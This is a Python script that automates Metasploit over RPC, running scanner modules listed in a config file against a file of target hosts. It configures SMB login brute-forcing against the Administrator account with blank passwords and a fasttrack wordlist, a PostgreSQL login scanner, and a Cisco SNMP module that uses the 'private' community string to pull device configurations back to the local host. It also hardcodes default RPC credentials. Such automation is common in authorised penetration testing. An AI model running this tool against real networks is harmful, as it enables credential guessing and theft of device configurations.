#!/usr/bin/env python
import sys
from time import sleep
import socket
from pymetasploit3.msfrpc import MsfRpcClient

# Define global variables
console_id = None
outfile = None
client = None

def initialise(username, msf_pass):
    global client
    global console_id

    # Initialize the Metasploit RPC client
    #client = MsfRpcClient(msf_pass, ssl=True)
    #client = MsfRpcClient('abc123', server='127.0.0.1', port=55552) # Replace 'abc123' with your actual RPC password
    client = MsfRpcClient(msf_pass, server='127.0.0.1', port=55552) 
    
    # Create a new console
    console = client.consoles.console()
    console_id = console.cid
    print(f"Console created: {console_id}")

    # Connect to the database
    console.write(f"db_connect {username}:{msf_pass}@127.0.0.1/msf\n")
    sleep(1)

def run_scan(scan_name, host_file):
    global client
    global console_id
    global outfile

    console = client.consoles.console(console_id)

    # Create a workspace and set the threads
    console.write("workspace -a msf_scanner\n")
    sleep(1)
    console.write("set THREADS 10\n")
    sleep(1)
    console.write("workspace msf_scanner\n")
    sleep(1)
    console.write(f"use {scan_name}\n")
    sleep(1)

    # Check for specific scan settings
    if scan_name == "auxiliary/scanner/smb/smb_login":
        set_smb_login()
    elif scan_name == "auxiliary/scanner/postgres/postgres_login":
        console.write("set RPORT 5432\n")
        sleep(1)
    elif scan_name == "auxiliary/scanner/snmp/cisco_config_tftp":
        set_snmp_config()

    # Set target hosts
    console.write(f"set RHOSTS file:{host_file}\n")
    sleep(1)

    # Run the scan
    console.write("run\n")
    sleep(5)

    # Monitor console output
    while True:
        res = console.read()
        if res['data']:
            print(res['data'], end='')
            outfile.write(res['data'])

        if res['busy']:
            sleep(1)
            continue
        break

def set_smb_login():
    global console_id
    console = client.consoles.console(console_id)
    console.write("set SMBDomain WORKGROUP\n")
    sleep(1)
    console.write("set BLANK_PASSWORDS true\n")
    sleep(1)
    console.write("set USER_AS_PASS true\n")
    sleep(1)
    console.write("set SMBUser Administrator\n")
    sleep(1)
    console.write("set PASS_FILE /usr/share/wordlists/fasttrack.txt\n")
    sleep(1)

def set_snmp_config():
    global console_id
    console = client.consoles.console(console_id)

    # Find the local IP address
    lhost = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] 
              if not ip.startswith("127.")][:1], 
              [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) 
              for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])

    console.write(f"set LHOST {lhost}\n")
    sleep(1)
    console.write("set COMMUNITY private\n")
    sleep(1)

def close_scanner():
    global console_id
    global outfile

    # Destroy the console session
    console = client.consoles.console(console_id)
    console.destroy()
    print("Console destroyed.")
    outfile.write("Console destroyed.\n")

def main():
    global outfile

    if len(sys.argv) < 2:
        print("Usage: msf_scan.py <target file> [username] [password]")
        sys.exit(0)

    host_file = sys.argv[1]
    config_file = "scan_types.cfg"

    # Load scan types from the configuration file
    with open(config_file) as infile:
        scans = infile.readlines()

    scans = [scan_name.strip() for scan_name in scans]

    if not scans:
        print("Scan config file is empty!")
        sys.exit(0)

    # Check if username and password are provided
    if len(sys.argv) == 4:
        username = sys.argv[2]
        msf_pass = sys.argv[3]
    else:
        username = "msf"
        msf_pass = "abc123"

    # Open output file
    outfile = open("msf_scan_output.txt", "w")

    outfile.write("MSF Scanning Output\n")
    outfile.write("===================\n\n")

    # Initialize Metasploit
    initialise(username, msf_pass)

    # Run each scan from the config file
    for scan_path in scans:
        if not scan_path.startswith("#"):
            print(f"Scan name: {scan_path}")
            outfile.write(f"Scan name: {scan_path}\n")
            outfile.write("---------------------------------------------------------------------------------\n")
            run_scan(scan_path, host_file)
            outfile.write("---------------------------------------------------------------------------------\n")

    # Close and cleanup
    close_scanner()
    print("Finished!")
    outfile.close()

if __name__ == "__main__":
    main()
